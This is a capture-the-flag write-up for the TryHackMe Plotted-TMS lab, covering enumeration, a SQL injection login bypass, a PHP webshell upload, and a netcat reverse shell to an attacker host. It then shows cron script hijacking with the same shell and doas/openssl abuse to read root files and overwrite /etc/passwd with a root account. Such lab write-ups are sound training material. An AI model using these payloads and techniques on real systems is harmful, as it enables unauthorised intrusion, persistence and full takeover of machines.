---
title: 'Plotted‑TMS — Writeup'
author: n0l1v3sm4tt3r
categories: [THM]
tags: [web, doas, fileupload, sql, sqlinjection, cron, crontab]
media_subpath: /images/thm-plotted/
image:
  path: plotted-logo.jpg
---

> **Room:** https://tryhackme.com/room/plottedtms  
> **Difficulty:** Easy

---

## Table of Contents

1. [Introduction](#introduction)  
2. [Recon / Basic Enumeration](#recon--basic-enumeration)  
3. [Web Recon (Port 80)](#web-recon-port-80)  
4. [Web Recon (Port 445)](#web-recon-port-445)  
5. [Accessing the Admin Dashboard](#accessing-the-admin-dashboard)  
6. [Uploading a Webshell](#uploading-a-webshell)  
7. [Getting a Reverse Shell](#getting-a-reverse-shell)  
8. [Horizontal Privilege Escalation](#horizontal-privilege-escalation)  
9. [Root Flag](#root-flag)  
10. [BONUS: Get a Root Shell](#bonus-get-a-root-shell)  

---

## Introduction

**Machine Info:**

- **Name:** Plotted‑TMS  
- **Source:** TryHackMe — room `plottedtms`  
- **Difficulty:** Easy

---

## Recon / Basic Enumeration

### Nmap Scan

```bash
mkdir -p nmap
nmap -A -T5 -Pn 10.10.208.196 -p- -oN nmap/total.txt
````

**Relevant Output:**

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp  open  http    Apache httpd 2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

**Open Ports:**

| Port | Service                              |
| ---- | ------------------------------------ |
| 22   | SSH                                  |
| 80   | HTTP                                 |
| 445  | HTTP (Apache; note: 445 usually SMB) |

> **Note:** On this machine, port 445 runs HTTP (Apache), not SMB.

---

## Web Recon (Port 80)

* Visiting the webroot shows the default Apache page:

![Apache default page](plotted-apache.png)

* Fuzzing with `gobuster`:

```bash
gobuster dir -u http://10.10.208.196 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -o gobuster/port_80.txt
```

**Interesting findings:**

```
/index.html    (200)  -> site index
/passwd        (200)  -> contains a short string
/shadow        (200)  -> contains a short string (bait)
```

* The `/shadow` file contained a Base64 string:

```bash
echo "bm90IHRoaXMgZWFzeSA6RA==" | base64 -d
# Result: not this easy :D
```

> **Note:** This is a decoy. Other files like `/passwd` and `/admin/id_rsa` are also bait.

---

## Web Recon (Port 445)

* Port 445 also hosts an Apache site (default page):

![Port 445 Apache page](plotted-445-apache.png)

* Fuzzing with `gobuster`:

```bash
gobuster dir -u http://10.10.208.196:445 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -o gobuster/port_445.txt
```

**Interesting discovery:**

```
/management  (301) -> /management/
```

* Visiting `/management/` reveals a management interface with a **login page**:

![Management index](management-index.png)
![Management login](management-login.png)

---

## Accessing the Admin Dashboard

You can try basic SQL injection payloads to bypass this login form, here are some.

```sql
' OR 1=1-- -
admin'-- -
' OR 1=1 LIMIT 1-- -
```

**This one** worked for me:

```
' OR 1=1-- -
```

> Logging in with this bypassed authentication and accessed the dashboard.

![Management dashboard](management-dashboard.png)

---

## Uploading a Webshell

1. Navigate to **Administrator Admin** in the dashboard.
2. Use the profile image upload field to upload a PHP webshell.

**Example webshell:**

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
  <input type="TEXT" name="cmd" id="cmd" size="80">
  <input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
  if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

* After upload, open the uploaded file in a new tab to access the webshell:

![Webshell uploaded](webshell-uploaded.png)
![Webshell interface](webshell.png)

---

## Getting a Reverse Shell

* From the webshell, execute a reverse shell using (using reverse-shell from [revshells website](https://revshells.com))

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
```

* On attacker machine:

```bash
sudo nc -nlvp <ATTACKER_PORT>
```

* Once connected, spawn a proper TTY shell:

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Horizontal Privilege Escalation

* Check crontab:

```bash
www-data@plotted:/www/scripts$ cat /etc/crontab
* * * * * plot_admin /var/www/scripts/backup.sh
```

* Replace `/var/www/scripts/backup.sh` with your reverse shell, wait for cron:

```bash
rm -fr /var/www/scripts/backup.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f" > /var/www/scripts/backup.sh
chmod +x /var/www/scripts/backup.sh
```

* Wait for cron to trigger, and connect as `plot_admin`:

```bash
plot_admin@plotted:~$ cat user.txt
REDACTED
```

---

## Root Flag

* Use linPEAS for privilege escalation enumeration:

```bash
mkdir web; cd web
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
python3 -m http.server 8000
```

* On victim:

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**linPEAS finds:**

```
Doas SUID binary:
-rwsr-xr-x 1 root root 39008 /bin/doas
/etc/doas.conf allows: permit nopass plot_admin as root cmd openssl
```

* Exploit to read root flag:

```bash
plot_admin@plotted:~$ doas -u root openssl enc -in "/root/root.txt"
REDACTED
```

---

## BONUS: Get a Root Shell

* Generate a SHA512 password hash:

```bash
mkpasswd -m sha-512 -S salt1234 <YOUR_PASSWORD>
```

* On the victim machine:

```bash
echo 'r00t:<YOUR_HASH>:0:0:/root:/bin/bash' | doas -u root openssl enc -out "/etc/passwd"
```

* Now you can `su r00t` and login with your password for a full root shell.

---